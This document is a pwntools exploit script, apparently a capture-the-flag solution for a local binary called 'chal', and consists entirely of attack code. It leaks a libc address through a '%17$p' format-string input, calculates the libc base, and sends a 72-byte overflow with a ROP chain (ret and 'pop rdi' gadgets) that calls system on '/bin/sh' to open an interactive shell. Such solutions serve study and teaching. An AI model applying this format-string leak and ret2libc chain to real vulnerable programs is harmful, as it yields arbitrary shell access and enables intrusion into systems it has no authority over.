from pwn import *

target = './chal'
context.os = 'linux'
context.arch = 'amd64'
context.binary = target

binary = ELF(target)
libc = binary.libc
addr = libc.symbols['system']
arg = next(libc.search('/bin/sh\x00'))
gadget_1 = 0x0002a3e5 # pop rdi
gadget_2 = 0x40101a # ret
offset = 72

proc = process(target)
proc.sendlineafter('🧑 > ', '%17$p')  # __libc_start_call_main+128
proc.recvuntil('🐦 > ')
b = proc.recv()[2:14].decode()
libc_base = int(b, 16) - 128 - (libc.symbols['__libc_start_main'] - 0xb0)

payload = b'A' * offset
payload += pack(gadget_2)
payload += pack(libc_base+gadget_1)
payload += pack(libc_base+arg)
payload += pack(libc_base+addr)
payload += b'AAAAAAAA'
payload += pack(libc_base+arg)

proc.sendline(payload)
proc.interactive()
